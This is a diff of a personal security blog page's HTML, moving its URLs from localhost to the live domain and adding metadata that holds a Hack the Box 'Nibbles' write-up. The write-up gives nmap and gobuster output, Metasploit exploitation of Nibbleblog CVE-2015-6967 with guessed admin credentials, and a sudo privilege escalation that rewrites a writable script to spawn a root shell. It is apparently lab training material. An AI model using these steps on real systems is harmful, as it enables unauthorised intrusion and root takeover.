@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>Nibbles - Hack the Box | Security With Ian</title>
 <meta name="keywords" content="">
 <meta name="description" content="Difficulty: Easy
@@ -27,16 +27,16 @@ Overview
 This Box was completed as part of the Hack the Box Academy Job Role Path &ldquo;Penetration Tester&rdquo; in the &ldquo;Getting Started&rdquo; Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals.
 Note: Flags documented in Appendix B">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/posts/nibbles---hack-the-box/">
+<link rel="canonical" href="https://SecurityWithIan.com/posts/nibbles---hack-the-box/">
 <link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="icon" href="https://SecurityWithIan.com/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://SecurityWithIan.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://SecurityWithIan.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://SecurityWithIan.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://SecurityWithIan.com/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/nibbles---hack-the-box/">
+<link rel="alternate" hreflang="en" href="https://SecurityWithIan.com/posts/nibbles---hack-the-box/">
 <noscript>
     <style>
         #theme-toggle,
@@ -82,13 +82,88 @@ Note: Flags documented in Appendix B">
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://SecurityWithIan.com/posts/nibbles---hack-the-box/">
+  <meta property="og:site_name" content="Security With Ian">
+  <meta property="og:title" content="Nibbles - Hack the Box">
+  <meta property="og:description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-02
+Write-up Authored by: Ian Simons
+Challenge Created by: mrb3n8132
+Core Competencies:
+Network Enumeration with Nmap Manual Web Enumeration Web Enumeration with Gobuster Vulnerability Research Initial Access with Metasploit Privilege Enumeration Privilege Escalation Overview This Box was completed as part of the Hack the Box Academy Job Role Path “Penetration Tester” in the “Getting Started” Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals. Note: Flags documented in Appendix B">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-09-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-09-02T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Nibbles - Hack the Box">
+  <meta name="twitter:description" content="Difficulty: Easy
+OS: Linux
+Date Completed: 2026-09-02
+Write-up Authored by: Ian Simons
+Challenge Created by: mrb3n8132
+Core Competencies:
+Network Enumeration with Nmap Manual Web Enumeration Web Enumeration with Gobuster Vulnerability Research Initial Access with Metasploit Privilege Enumeration Privilege Escalation Overview This Box was completed as part of the Hack the Box Academy Job Role Path “Penetration Tester” in the “Getting Started” Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals. Note: Flags documented in Appendix B">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://SecurityWithIan.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Nibbles - Hack the Box",
+      "item": "https://SecurityWithIan.com/posts/nibbles---hack-the-box/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Nibbles - Hack the Box",
+  "name": "Nibbles - Hack the Box",
+  "description": "Difficulty: Easy\nOS: Linux\nDate Completed: 2026-09-02\nWrite-up Authored by: Ian Simons\nChallenge Created by: mrb3n8132\nCore Competencies:\nNetwork Enumeration with Nmap Manual Web Enumeration Web Enumeration with Gobuster Vulnerability Research Initial Access with Metasploit Privilege Enumeration Privilege Escalation Overview This Box was completed as part of the Hack the Box Academy Job Role Path \u0026ldquo;Penetration Tester\u0026rdquo; in the \u0026ldquo;Getting Started\u0026rdquo; Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals. Note: Flags documented in Appendix B\n",
+  "keywords": [
+    
+  ],
+  "articleBody": "Difficulty: Easy\nOS: Linux\nDate Completed: 2026-09-02\nWrite-up Authored by: Ian Simons\nChallenge Created by: mrb3n8132\nCore Competencies:\nNetwork Enumeration with Nmap Manual Web Enumeration Web Enumeration with Gobuster Vulnerability Research Initial Access with Metasploit Privilege Enumeration Privilege Escalation Overview This Box was completed as part of the Hack the Box Academy Job Role Path “Penetration Tester” in the “Getting Started” Module. The purpose of completing this box is to build familiarity with the Hack the Box platform. While the Academy module walks the user through this Box, I opted to complete it on my own using my existing, albeit limited, skillset. Additionally, this was another opportunity to sharpen my Metasploit fundamentals. Note: Flags documented in Appendix B\nVulnerability summary Vulnerability Vulnerability Classification CVSS Score MITRE ATT\u0026CK Technique ATT\u0026CK Tactic Nibbleblog 4.0.3 - Arbitrary File Upload CVE-2015-6967 6.5 (CVSS v2) T1190 - Exploit Public-Facing Application Initial Access Weak Credentials CWE - 521 - Weak Password Requirements N/A T1078 - Valid Accounts Initial Access Writable Script Executable via Sudo CWE - 732 - Incorrect Permission Assignment for Critical Resource N/A T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching Privilege Escalation Attack Path Summary Performed network reconnaissance with Nmap and identified OpenSSH 7.2p2 running on Ubuntu as well as Apache HTTP Server 2.4.18 Performed web enumeration, and identified Nibbleblog v4.0.3 Identified the username admin in a configuration file Identified valid credentials admin:nibbles through contextual password analysis Leveraged the Metasploit Framework module exploit/multi/http/nibbleblog_file_upload to gain initial access to the machine Identified that the current user had NOPASSWD sudo privileges for /home/nibbler/personal/stuff/monitor.sh Identified that current user has write access to /home/nibbler/personal/stuff/monitor.sh Edited the script monitor.sh to spawn a root shell and ran script, successfully achieving root privileges Reconnaissance Port Discovery Nmap scan results\n┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~] └──╼ [★]$ sudo nmap -sC -sV -oN scan.txt 10.129.64.28 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-02 14:01 EDT Nmap scan report for 10.129.64.28 Host is up (0.0085s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds Key Open Ports and Services Port Service Version 22/TCP SSH OpenSSH 7.2p2 80/TCP HTTP Apache httpd 2.4.18 Web Enumeration Web application returned a page displaying only “Hello world!”, but a comment in the html said, . Upon navigating to /nibbleblog an empty blog was found, in the bottom right stating it was “Powered by Nibbleblog” ran a Gobuster scan against the blog and found the following results.\n┌─[us-dedivip-3]─[10.10.14.169]─[n00blyfe@htb-cmbv9jzfzm]─[~] └──╼ [★]$ gobuster dir -u http://10.129.64.28/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.64.28/nibbleblog/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /content (Status: 301) [Size: 325] [--\u003e http://10.129.64.28/nibbleblog/content/] /themes (Status: 301) [Size: 324] [--\u003e http://10.129.64.28/nibbleblog/themes/] /admin (Status: 301) [Size: 323] [--\u003e http://10.129.64.28/nibbleblog/admin/] /plugins (Status: 301) [Size: 325] [--\u003e http://10.129.64.28/nibbleblog/plugins/] /README (Status: 200) [Size: 4628] /languages (Status: 301) [Size: 327] [--\u003e http://10.129.64.28/nibbleblog/languages/] Progress: 87664 / 87665 (100.00%) =============================================================== Finished =============================================================== Identified nibble blog version of 4.0.3 on /nibbleblog/README which was publicly accessible. Identified username admin in the file /nibbleblog/content/private/users.xml which was publicly accessible.\nVulnerability Research Publicly Accessible page /nibbleblog/README identified Nibbleblog version 4.0.3. Research identified CVE-2015-6967 an arbitrary file upload vulnerability allowing remote code execution through the my_image plugin, and an existing Metasploit module.\nInitial Access Vulnerability Details Description: Nibbleblog 4.0.3 - Arbitrary File Upload, Weak Credentials Vulnerability Classification: CVE-2015-6967, CWE - 521 - Weak Password Requirements CVSS score: 6.5 (CVSS v2), N/A MITRE ATT\u0026CK: Initial Access - T1190: Exploit Public-Facing Application, Initial Access - T1078: Valid Accounts Nibble Blog 4.0.3 is vulnerable to an unrestricted file upload. This means that administrators can upload files with an executable extension which would then allow them to execute arbitrary code using a direct request to /content/private/plugins/my_image/image.php. There is an existing Metasploit Module for this vulnerability and as I am working to improve my Metasploit skills we will utilize this module.\nExploitation Steps Based on the identified Nibble Blog 4.0.3 vulnerability we identified, the Metasploit module exploit/multi/http/nibbleblog_file_upload was selected because it specifically targets CVE-2015-6967. Only the username admin had been identified so far. Because the application enforced a strict login lockout policy, traditional password spraying or guessing attacks were not feasible. However, the machine name, application name, and username all revolved around the term “nibble”, making “nibbles” a reasonable contextual password candidate. Authentication was successful using this credential.\nLaunch Metasploit framework Select module exploit/multi/http/nibbleblog_file_upload targeting CVE-2015-6967 Configure target and callback parameters Execute the exploit and obtain a remote session Key Commands / Payloads # launch Metasploit Framework console msfconsole # select appropriate exploit module use exploit/multi/http/nibbleblog_file_upload # set appropriate options for module set PASSWORD nibbles set RHOST set RPORT 80 set TARGETURI /nibbleblog/ set USERNAME admin set LHOST set LPORT 4444 # run exploit run Proof of Access Screenshots Figure 1: Proof of initial access. Successful exploitation of CVE-2015-6967 resulted in command execution on the target host. Session validated by confirming execution context, hostname, and operating system.\nSession Validation Commands #Check user context whoami #Verify target hostname hostname #Verify operating system version uname -a Privilege Escalation Vulnerability Details Description: Writable Script Executable via Sudo Vulnerability Classification: CWE - 732 Sudo Misconfiguration CVSS score: N/A MITRE ATT\u0026CK: Privilege Escalation - T1548.003: Abuse Elevation Control Mechanism: Sudo and Sudo caching Enumeration of sudo privileges revealed that the user nibbler could execute /home/nibbler/personal/stuff/monitor.sh as root without providing a password. Because the user had write permissions within the script directory, it was possible to modify the script and execute arbitrary commands as root.\nExploitation Steps Check current sudo privileges Create required directories Create malicious script Change script permissions Execute script with sudo and obtain root privileges Key Commands / Payloads # check current sudo privileges sudo -l # create necessary directories mkdir -p /home/nibbler/personal/stuff # create malicious script echo \"bash -c '/bin/bash'\" \u003e /home/nibbler/personal/stuff/monitor.sh # change script permissions chmod +x /home/nibbler/personal/stuff/monitor.sh # run script as root sudo /home/nibbler/personal/stuff/monitor.sh # verify execution context whoami Proof of Privilege Escalation Figure 2: Proof of Privilege Escalation. Successful exploitation resulted in execution within the root security context. Privileges were validated by confirming the execution context with the whoami command.\nLessons Learned This box really pushed me. While I did use Gobuster for some web directory enumeration, I still did plenty of manual Web Enumeration. This really helped build my Web Enumeration skills, as well as improve my confidence as I am still quite new to offensive security. The Privilege Escalation section also pushed me. However it was really cool to see examples covered in Academy used in the wild some key takeaways include:\nFindings, no matter how small, can lead lead to significant compromoze Make zero assumptions, nibble blog at first just seemed like the name of the blog, and I absent-mindedly assumed it was for longer than I would like to admit. Slow down while performing Enumeration, don’t rush or you may miss obvious opportunities Appendix Appendix A Tools Used Tool Purpose Nmap Network Reconnaissance, Service Discovery, and version detection SearchSploit Vulnerability research and exploit identification Metasploit Framework Exploitation, session management, post-exploitation, and privilege escalation Appendix B Flags found User Flag: 700c*************************7d1\nRoot Flag: aa4**************************6e9\nAppendix C Supporting Evidence No additional supporting evidence was required beyond the artifacts included throughout this write-up\n",
+  "wordCount" : "1291",
+  "inLanguage": "en",
+  "datePublished": "2026-09-02T00:00:00Z",
+  "dateModified": "2026-09-02T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://SecurityWithIan.com/posts/nibbles---hack-the-box/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Security With Ian",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://SecurityWithIan.com/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
+            <a href="https://SecurityWithIan.com/" accesskey="h" title="Security With Ian (Alt + H)">Security With Ian</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -114,12 +189,12 @@ Note: Flags documented in Appendix B">
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/posts" title="Posts">
+                <a href="https://SecurityWithIan.com/posts" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/security-toolkit/" title="Security Toolkit">
+                <a href="https://SecurityWithIan.com/security-toolkit/" title="Security Toolkit">
                     <span>Security Toolkit</span>
                 </a>
             </li>
@@ -429,7 +504,7 @@ aa4**************************6e9</p>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">Security With Ian</a></span> · 
+        <span>&copy; 2026 <a href="https://SecurityWithIan.com/">Security With Ian</a></span> · 
 
     
     
